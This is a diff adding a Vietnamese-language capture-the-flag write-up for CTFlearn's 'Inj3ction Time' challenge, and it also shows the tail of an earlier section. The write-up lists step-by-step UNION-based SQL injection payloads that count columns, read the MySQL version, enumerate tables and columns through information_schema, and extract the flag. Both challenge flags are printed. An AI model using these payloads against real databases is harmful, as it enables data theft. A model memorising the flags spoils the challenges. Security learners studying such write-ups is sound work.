@@ -86,3 +86,63 @@ Vậy có thể hiểu server yêu cầu chúng ta cung cấp header `Referer` v
 ### Flag
 
 `flag{did_this_m3ss_with_y0ur_h34d}`
+
+## Inj3ction Time
+
+> I stumbled upon this website: <http://web.ctflearn.com/web8/> and I think they have the flag in their somewhere. UNION might be a helpful command
+
+### Solution
+
+Chúng ta lại có một thử thách liên quan tới lỗ hổng SQL Injection:
+
+![image](images/inj3ction-time/image-1.png)
+
+Với payload dưới, chúng ta xác định được câu truy vấn gốc lấy ra 4 cột:
+
+```sql
+123 UNION SELECT null,null,null,null#`
+```
+
+![image](images/inj3ction-time/image-2.png)
+
+Chúng ta chắc chắn rằng server sử dụng MySQL với payload:
+
+```sql
+123 UNION SELECT @@version,null,null,null#
+```
+
+![image](images/inj3ction-time/image-3.png)
+
+![image](images/inj3ction-time/image-4.png)
+
+Do đó, chúng ta dùng payload dưới để tìm ra các bảng tồn tại trong database hiện tại:
+
+```sql
+123 UNION SELECT table_name,null,null,null FROM information_schema.tables WHERE table_schema=database()#
+```
+
+Có 2 bảng là `w0w_y0u_f0und_m3` và `webeight`, chúng ta chú ý tới bảng `w0w_y0u_f0und_m3`:
+
+![image](images/inj3ction-time/image-5.png)
+
+Tiếp theo là cần tìm ra tên cột để có thể lấy dữ liệu, chúng ta sẽ dùng payload:
+
+```sql
+123 UNION SELECT column_name,null,null,null FROM information_schema.columns#
+```
+
+Chúng ta thấy có cột `f0und_m3`:
+
+![image](images/inj3ction-time/image-6.png)
+
+Đã biết được tên cột, công việc cuối cùng là đọc flag:
+
+```sql
+123 UNION SELECT f0und_m3,null,null,null FROM w0w_y0u_f0und_m3#
+```
+
+![image](images/inj3ction-time/image-7.png)
+
+### Flag
+
+`abctf{uni0n_1s_4_gr34t_c0mm4nd}`
